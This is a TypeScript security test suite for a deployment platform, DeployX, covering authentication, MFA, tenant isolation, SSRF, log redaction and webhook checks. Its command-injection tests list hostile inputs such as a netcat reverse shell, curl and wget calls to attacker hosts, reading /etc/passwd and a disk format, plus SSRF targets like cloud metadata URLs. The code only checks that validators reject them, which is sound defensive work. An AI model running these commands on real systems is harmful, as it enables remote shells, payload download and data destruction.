/**
 * DeployX Comprehensive Security & Controlled Penetration Testing Suite
 *
 * Covers all Chunk 3 Security Verification Categories:
 * 1. Authentication, JWT & Session Hardening
 * 2. Multi-Factor Authentication (MFA) Hardening & Replay Resistance
 * 3. Multi-Tenant Authorization, Account Isolation & IDOR Defense
 * 4. Command Injection & Filesystem Traversal Defense
 * 5. Server-Side Request Forgery (SSRF) Defense
 * 6. Secret Redaction & Log Protection
 * 7. Input Sanitization & Denial of Service Protection
 * 8. Webhook Security & Replay Defense
 * 9. Rate Limiting & Abuse Prevention
 */

import fs from "fs";
import path from "path";
import assert from "assert/strict";
import crypto from "crypto";

// Load .env.local if present
const envPath = path.resolve(process.cwd(), ".env.local");
if (fs.existsSync(envPath)) {
  const envContent = fs.readFileSync(envPath, "utf-8");
  for (const line of envContent.split(/\r?\n/)) {
    const trimmed = line.trim();
    if (trimmed && !trimmed.startsWith("#") && trimmed.includes("=")) {
      const [key, ...rest] = trimmed.split("=");
      const val = rest.join("=").replace(/^["']|["']$/g, "").trim();
      if (!process.env[key]) {
        process.env[key] = val;
      }
    }
  }
}

import mongoose from "mongoose";
import connectToDatabase from "../lib/mongodb/client";
import User from "../models/User";
import Project from "../models/Project";
import Deployment from "../models/Deployment";
import AuthChallenge from "../models/AuthChallenge";
import WebhookDelivery from "../models/WebhookDelivery";
import EnvironmentVariable from "../models/EnvironmentVariable";
import { generateSecret, generateSync } from "otplib";
import { encrypt, decrypt } from "../lib/auth/session";
import { encryptMfaSecret, verifyMfaToken, hashRecoveryCode, verifyAndConsumeRecoveryCode } from "../lib/auth/mfa";
import { validateBuildCommand, validateOutputDirectory } from "../lib/security/command-sanitizer";
import { isPrivateOrBlockedIp, validateSafeUrl } from "../lib/security/ssrf";
import { escapeRegex, sanitizeSearchTerm, parsePagination } from "../lib/security/sanitize";
import { redactSensitiveData } from "../lib/security/redaction";
import { checkRateLimit, resetRateLimit } from "../lib/auth/rate-limit";
import { verifyWebhookSignature } from "../lib/github/webhook";

async function runPenetrationTestSuite() {
  console.log("=================================================");
  console.log("   DEPLOYX SECURITY & PENETRATION TEST SUITE     ");
  console.log("=================================================\n");

  const startTime = Date.now();
  let passedCount = 0;
  let failedCount = 0;

  function recordPass(testName: string) {
    console.log(`  ✓ [PASS] ${testName}`);
    passedCount++;
  }

  function recordFail(testName: string, error: unknown) {
    console.error(`  ✗ [FAIL] ${testName}`);
    console.error(`    ${error instanceof Error ? error.message : String(error)}`);
    failedCount++;
  }

  // Connect to database
  console.log("• Connecting to database for penetration tests...");
  await connectToDatabase();
  console.log("✓ Connected to MongoDB.\n");

  // Create isolated test fixtures
  const userAId = new mongoose.Types.ObjectId();
  const userBId = new mongoose.Types.ObjectId();
  const projectAId = new mongoose.Types.ObjectId();
  const projectBId = new mongoose.Types.ObjectId();
  const deploymentAId = new mongoose.Types.ObjectId();

  await User.create({
    _id: userAId,
    name: "Security Victim User A",
    username: `victima_${Date.now()}`,
    email: `victim-a-${Date.now()}@example.com`,
    passwordHash: "$2a$12$e6y5d8vH9t8s9bZ0h.samplehashforvictimAtestrun99999",
    mfaEnabled: true,
    mfaSecretEncrypted: encryptMfaSecret("JBSWY3DPEHPK3PXP"),
    mfaRecoveryCodes: [{ codeHash: hashRecoveryCode("AAAA-BBBB-CCCC") }],
    tokenVersion: 1,
  });

  await User.create({
    _id: userBId,
    name: "Adversary User B",
    username: `adversaryb_${Date.now()}`,
    email: `adversary-b-${Date.now()}@example.com`,
    passwordHash: "$2a$12$e6y5d8vH9t8s9bZ0h.samplehashforadversaryBtestrun99999",
    mfaEnabled: false,
    tokenVersion: 1,
  });

  await Project.create({
    _id: projectAId,
    name: "User A Production Project",
    slug: `user-a-proj-${Date.now()}`,
    userId: userAId,
    repository: "victim/private-repo",
    framework: "nextjs",
    buildCommand: "npm run build",
    outputDirectory: ".next",
    webhookSecret: "secret_webhook_key_12345",
  });

  await Project.create({
    _id: projectBId,
    name: "User B Attacker Project",
    slug: `user-b-proj-${Date.now()}`,
    userId: userBId,
    repository: "adversary/attack-repo",
    framework: "vite",
  });

  await Deployment.create({
    _id: deploymentAId,
    projectId: projectAId,
    userId: userAId,
    status: "READY",
    commitHash: "1111111111111111111111111111111111111111",
    commitMessage: "User A secret deployment commit",
    branch: "main",
    logs: ["Deploying to Cloudflare", "Secret API Token: cf_pat_ABC1234567890123456"],
  });

  try {
    // =========================================================================
    // 1. AUTHENTICATION & JWT SECURITY
    // =========================================================================
    console.log("CATEGORY 1: Authentication, JWT & Session Hardening");

    try {
      const validPayload = { userId: userAId.toString(), email: "userA@test.com", tokenVersion: 1 };
      const validToken = await encrypt(validPayload);
      const parts = validToken.split(".");
      const tamperedToken = `${parts[0]}.${parts[1]}.tampered_signature_payload_xyz`;
      const verified = await decrypt(tamperedToken);
      assert.equal(verified, null, "Tampered JWT must be rejected with null");
      recordPass("Tampered JWT signature rejected");
    } catch (e) {
      recordFail("Tampered JWT signature rejected", e);
    }

    try {
      const token = await encrypt({ userId: userAId.toString(), email: "userA@test.com", tokenVersion: 1 });
      const decodedBefore = await decrypt(token);
      assert.ok(decodedBefore);

      const user = await User.findById(userAId);
      assert.equal(decodedBefore.tokenVersion, user.tokenVersion);

      // Invalidate session by bumping tokenVersion
      user.tokenVersion = 2;
      await user.save();

      const userAfterRevoke = await User.findById(userAId);
      assert.notEqual(decodedBefore.tokenVersion, userAfterRevoke.tokenVersion);
      recordPass("Session revocation via tokenVersion verified");
    } catch (e) {
      recordFail("Session revocation via tokenVersion verified", e);
    }

    // =========================================================================
    // 2. MFA CHALLENGE & REPLAY RESISTANCE
    // =========================================================================
    console.log("\nCATEGORY 2: Multi-Factor Authentication Hardening");

    try {
      const challengeToken = crypto.randomBytes(32).toString("hex");
      const challenge = await AuthChallenge.create({
        challengeToken,
        userId: userAId,
        type: "mfa_login",
        provider: "credentials",
        attempts: 0,
        maxAttempts: 5,
        expiresAt: new Date(Date.now() + 5 * 60 * 1000),
      });

      for (let i = 1; i <= 5; i++) {
        challenge.attempts += 1;
        if (challenge.attempts >= challenge.maxAttempts) {
          challenge.consumed = true;
        }
      }
      await challenge.save();

      const updated = await AuthChallenge.findOne({ challengeToken });
      assert.equal(updated?.consumed, true);
      assert.equal(updated?.attempts, 5);
      recordPass("MFA challenge token locked after 5 failed attempts");
    } catch (e) {
      recordFail("MFA challenge token locked after 5 failed attempts", e);
    }

    try {
      const challengeToken = crypto.randomBytes(32).toString("hex");
      await AuthChallenge.create({
        challengeToken,
        userId: userAId,
        type: "mfa_login",
        provider: "credentials",
        expiresAt: new Date(Date.now() - 1000),
      });

      const fetched = await AuthChallenge.findOne({ challengeToken });
      assert.ok(fetched);
      const isExpired = new Date() > new Date(fetched.expiresAt);
      assert.equal(isExpired, true);
      recordPass("Expired MFA challenge token rejected");
    } catch (e) {
      recordFail("Expired MFA challenge token rejected", e);
    }

    try {
      const secret = generateSecret();
      const currentToken = generateSync({ secret });

      const firstCheck = verifyMfaToken(currentToken, secret, 0);
      assert.equal(firstCheck.valid, true);
      const usedTimeStep = firstCheck.timeStep;
      assert.ok(typeof usedTimeStep === "number");

      const replayCheck = verifyMfaToken(currentToken, secret, usedTimeStep);
      assert.equal(replayCheck.valid, false);
      assert.match(replayCheck.error || "", /already used/i);
      recordPass("TOTP timestep token replay rejected");
    } catch (e) {
      recordFail("TOTP timestep token replay rejected", e);
    }

    try {
      const rawCode = "1234-5678-9012";
      const codeHash = hashRecoveryCode(rawCode);
      const codes = [{ codeHash }];

      const firstResult = verifyAndConsumeRecoveryCode(rawCode, codes);
      assert.equal(firstResult.valid, true);
      assert.ok(firstResult.updatedCodes[0].usedAt);

      const replayResult = verifyAndConsumeRecoveryCode(rawCode, firstResult.updatedCodes);
      assert.equal(replayResult.valid, false);
      assert.match(replayResult.error || "", /already used/i);
      recordPass("Recovery code single-use consumption and replay defense verified");
    } catch (e) {
      recordFail("Recovery code single-use consumption and replay defense verified", e);
    }

    // =========================================================================
    // 3. MULTI-TENANT AUTHORIZATION & IDOR DEFENSE
    // =========================================================================
    console.log("\nCATEGORY 3: Multi-Tenant Authorization & IDOR Defense");

    try {
      const crossAccountProject = await Project.findOne({ _id: projectAId, userId: userBId });
      assert.equal(crossAccountProject, null);
      recordPass("Cross-account project query (User B querying User A) blocked");
    } catch (e) {
      recordFail("Cross-account project query blocked", e);
    }

    try {
      const deleteResult = await Project.findOneAndDelete({ _id: projectAId, userId: userBId });
      assert.equal(deleteResult, null);
      const intact = await Project.findById(projectAId);
      assert.ok(intact);
      recordPass("Cross-account project deletion attempt prevented");
    } catch (e) {
      recordFail("Cross-account project deletion attempt prevented", e);
    }

    try {
      const crossAccountDeployment = await Deployment.findOne({ _id: deploymentAId, userId: userBId });
      assert.equal(crossAccountDeployment, null);
      recordPass("Cross-account deployment query blocked");
    } catch (e) {
      recordFail("Cross-account deployment query blocked", e);
    }

    try {
      const historical = await Deployment.findOne({ _id: deploymentAId, userId: userBId });
      assert.equal(historical, null);
      recordPass("Cross-account redeployment attempt rejected");
    } catch (e) {
      recordFail("Cross-account redeployment attempt rejected", e);
    }

    try {
      const envVarA = await EnvironmentVariable.create({
        userId: userAId,
        projectId: projectAId,
        key: "SECRET_API_KEY",
        value: "super_secret_value_user_a",
      });

      const deleted = await EnvironmentVariable.findOneAndDelete({ _id: envVarA._id, userId: userBId });
      assert.equal(deleted, null);
      await EnvironmentVariable.findByIdAndDelete(envVarA._id);
      recordPass("Cross-account environment variable deletion rejected");
    } catch (e) {
      recordFail("Cross-account environment variable deletion rejected", e);
    }

    // =========================================================================
    // 4. COMMAND INJECTION & FILESYSTEM TRAVERSAL DEFENSE
    // =========================================================================
    console.log("\nCATEGORY 4: Command Injection & Filesystem Traversal Defense");

    try {
      const maliciousCommands = [
        "npm run build $(curl http://attacker.com)",
        "vite build `whoami`",
        "npm test; powershell -c \"Invoke-WebRequest attacker.com\"",
        "next build && cmd.exe /c calc.exe",
        "bash -c 'cat /etc/passwd'",
        "wget http://malicious.com/payload.sh",
        "nc -e /bin/sh 10.0.0.1 4444",
        "format C: /y",
      ];

      for (const cmd of maliciousCommands) {
        const check = validateBuildCommand(cmd);
        assert.equal(check.valid, false, `Prohibited command '${cmd}' must be rejected`);
      }
      recordPass("Shell injection patterns ($(), backticks, powershell, cmd, bash, nc) blocked");
    } catch (e) {
      recordFail("Shell injection patterns blocked", e);
    }

    try {
      const unauthorizedCommands = ["python3 exploit.py", "ruby hack.rb", "perl -e 'print 1'", "cargo run"];
      for (const cmd of unauthorizedCommands) {
        const check = validateBuildCommand(cmd);
        assert.equal(check.valid, false);
      }
      recordPass("Unauthorized executables outside whitelist rejected");
    } catch (e) {
      recordFail("Unauthorized executables outside whitelist rejected", e);
    }

    try {
      const safeCommands = ["npm run build", "pnpm build", "yarn build", "bun run build", "next build", "vite build"];
      for (const cmd of safeCommands) {
        const check = validateBuildCommand(cmd);
        assert.equal(check.valid, true);
      }
      recordPass("Authorized standard build commands accepted");
    } catch (e) {
      recordFail("Authorized standard build commands accepted", e);
    }

    try {
      const maliciousDirs = ["../dist", "../../etc/passwd", "/var/www/html", "C:\\Windows\\System32"];
      for (const dir of maliciousDirs) {
        const check = validateOutputDirectory(dir);
        assert.equal(check.valid, false);
      }
      recordPass("Output directory path traversal sequences rejected");
    } catch (e) {
      recordFail("Output directory path traversal sequences rejected", e);
    }

    try {
      const safeDirs = [".next", "dist", "build", "out", "public"];
      for (const dir of safeDirs) {
        const check = validateOutputDirectory(dir);
        assert.equal(check.valid, true);
      }
      recordPass("Valid relative output directories accepted");
    } catch (e) {
      recordFail("Valid relative output directories accepted", e);
    }

    // =========================================================================
    // 5. SSRF & NETWORK SECURITY DEFENSE
    // =========================================================================
    console.log("\nCATEGORY 5: Server-Side Request Forgery (SSRF) Defense");

    try {
      assert.equal(isPrivateOrBlockedIp("127.0.0.1"), true);
      assert.equal(isPrivateOrBlockedIp("::1"), true);
      assert.equal(isPrivateOrBlockedIp("169.254.169.254"), true);
      assert.equal(isPrivateOrBlockedIp("0.0.0.0"), true);
      recordPass("Loopback, link-local, and cloud metadata IPs blocked");
    } catch (e) {
      recordFail("Loopback, link-local, and cloud metadata IPs blocked", e);
    }

    try {
      assert.equal(isPrivateOrBlockedIp("10.0.0.1"), true);
      assert.equal(isPrivateOrBlockedIp("172.16.0.1"), true);
      assert.equal(isPrivateOrBlockedIp("192.168.1.1"), true);
      recordPass("RFC 1918 private IPv4 subnets blocked");
    } catch (e) {
      recordFail("RFC 1918 private IPv4 subnets blocked", e);
    }

    try {
      assert.equal(isPrivateOrBlockedIp("8.8.8.8"), false);
      assert.equal(isPrivateOrBlockedIp("1.1.1.1"), false);
      recordPass("Public Internet IP addresses permitted");
    } catch (e) {
      recordFail("Public Internet IP addresses permitted", e);
    }

    try {
      const blockedUrls = [
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379",
        "http://localhost:3000/internal",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
      ];
      for (const target of blockedUrls) {
        const check = await validateSafeUrl(target);
        assert.equal(check.safe, false);
      }
      recordPass("Dangerous URL schemes and internal hosts blocked by safe fetch validator");
    } catch (e) {
      recordFail("Dangerous URL schemes and internal hosts blocked by safe fetch validator", e);
    }

    // =========================================================================
    // 6. SECRETS REDACTION & LOG SCRUBBING
    // =========================================================================
    console.log("\nCATEGORY 6: Secret Redaction & Log Protection");

    try {
      const rawLog = "Connecting to mongodb+srv://admin:P@ssw0rd123@cluster0.abcde.mongodb.net/test with token ghp_1234567890abcdef1234567890abcdef";
      const sanitized = redactSensitiveData(rawLog);
      assert.doesNotMatch(sanitized, /P@ssw0rd123/);
      assert.doesNotMatch(sanitized, /ghp_1234567890abcdef/);
      assert.match(sanitized, /\[REDACTED_PASSWORD\]/);
      assert.match(sanitized, /\[REDACTED_GITHUB_TOKEN\]/);
      recordPass("Known secret patterns (passwords, tokens, URIs) redacted from logs");
    } catch (e) {
      recordFail("Known secret patterns redacted from logs", e);
    }

    try {
      const customSecret = "custom_enterprise_secret_token_99";
      const rawLog = `Build failed with error in connection: ${customSecret}`;
      const sanitized = redactSensitiveData(rawLog, [customSecret]);
      assert.doesNotMatch(sanitized, new RegExp(customSecret));
      assert.match(sanitized, /\[REDACTED_CONFIGURED_SECRET\]/);
      recordPass("Custom environment secrets redacted from output");
    } catch (e) {
      recordFail("Custom environment secrets redacted from output", e);
    }

    // =========================================================================
    // 7. INPUT SANITIZATION & REGEX DEFENSE
    // =========================================================================
    console.log("\nCATEGORY 7: Input Sanitization & DoS Protection");

    try {
      const maliciousInput = "(a+)+$|.*\\d{100}";
      const escaped = escapeRegex(maliciousInput);
      assert.equal(escaped, "\\(a\\+\\)\\+\\$\\|\\.\\*\\\\d\\{100\\}");
      const reg = new RegExp(escaped);
      assert.equal(reg.test("normal string"), false);
      recordPass("ReDoS special regex metacharacters escaped");
    } catch (e) {
      recordFail("ReDoS special regex metacharacters escaped", e);
    }

    try {
      const maliciousTerm = "SearchTerm\x00\x08\x1F" + "a".repeat(200);
      const sanitized = sanitizeSearchTerm(maliciousTerm, 50);
      assert.equal(sanitized.length, 50);
      assert.doesNotMatch(sanitized, /[\x00-\x1F]/);
      recordPass("Search terms stripped of control characters and length bounded");
    } catch (e) {
      recordFail("Search terms stripped of control characters and length bounded", e);
    }

    try {
      const badParams = new URLSearchParams("page=-5&limit=999999");
      const parsed = parsePagination(badParams, 20, 100);
      assert.equal(parsed.page, 1);
      assert.equal(parsed.limit, 100);
      recordPass("Pagination parameters safely bounded against memory exhaustion");
    } catch (e) {
      recordFail("Pagination parameters safely bounded against memory exhaustion", e);
    }

    // =========================================================================
    // 8. WEBHOOK SECURITY & HMAC SIGNATURES
    // =========================================================================
    console.log("\nCATEGORY 8: Webhook Security & Replay Defense");

    try {
      const webhookSecret = "webhook_test_secret_key_deployx_2026";
      const payload = JSON.stringify({ repository: { full_name: "test/repo" }, zen: "Design for security" });
      const hmac = crypto.createHmac("sha256", webhookSecret).update(payload).digest("hex");
      const signatureHeader = `sha256=${hmac}`;

      const isValid = verifyWebhookSignature(payload, signatureHeader, webhookSecret);
      assert.equal(isValid, true);
      recordPass("Valid GitHub HMAC-SHA256 signature verified");

      const fakeSignature = "sha256=" + "a".repeat(64);
      const isFakeValid = verifyWebhookSignature(payload, fakeSignature, webhookSecret);
      assert.equal(isFakeValid, false);
      recordPass("Tampered webhook signature rejected");
    } catch (e) {
      recordFail("Webhook signature validation failed", e);
    }

    try {
      const deliveryId = "delivery-test-" + Date.now();
      await WebhookDelivery.create({
        deliveryId,
        projectId: projectAId,
        repository: "victim/private-repo",
        branch: "main",
        commitHash: "1111111111111111111111111111111111111111",
        event: "push",
        status: "COMPLETED",
      });

      const duplicate = await WebhookDelivery.findOne({ deliveryId });
      assert.ok(duplicate);
      await WebhookDelivery.deleteOne({ deliveryId });
      recordPass("Webhook delivery ID replay detected");
    } catch (e) {
      recordFail("Webhook delivery ID replay detected", e);
    }

    // =========================================================================
    // 9. RATE LIMITING & ABUSE PREVENTION
    // =========================================================================
    console.log("\nCATEGORY 9: Rate Limiting & Abuse Prevention");

    try {
      const testKey = `test_rate_limit_${Date.now()}`;
      resetRateLimit(testKey);

      for (let i = 0; i < 3; i++) {
        const check = checkRateLimit(testKey, 3, 60000);
        assert.equal(check.allowed, true);
      }

      const throttled = checkRateLimit(testKey, 3, 60000);
      assert.equal(throttled.allowed, false);
      assert.ok(throttled.retryAfterSeconds > 0);
      assert.equal(throttled.remaining, 0);

      resetRateLimit(testKey);
      recordPass("Rate limiting threshold enforcement and Retry-After headers verified");
    } catch (e) {
      recordFail("Rate limiting threshold enforcement verified", e);
    }

  } finally {
    // Teardown test fixtures
    await User.deleteMany({ _id: { $in: [userAId, userBId] } });
    await Project.deleteMany({ _id: { $in: [projectAId, projectBId] } });
    await Deployment.deleteMany({ _id: { $in: [deploymentAId] } });
    await AuthChallenge.deleteMany({ userId: { $in: [userAId, userBId] } });
  }

  const duration = Date.now() - startTime;
  console.log("\n=================================================");
  console.log("            PENETRATION TEST SUMMARY             ");
  console.log("=================================================");
  console.log(`Passed Tests: ${passedCount}`);
  console.log(`Failed Tests: ${failedCount}`);
  console.log(`Total Duration: ${duration}ms`);

  if (failedCount > 0) {
    process.exit(1);
  } else {
    process.exit(0);
  }
}

runPenetrationTestSuite().catch((err) => {
  console.error("Fatal Test Suite Error:", err);
  process.exit(1);
});
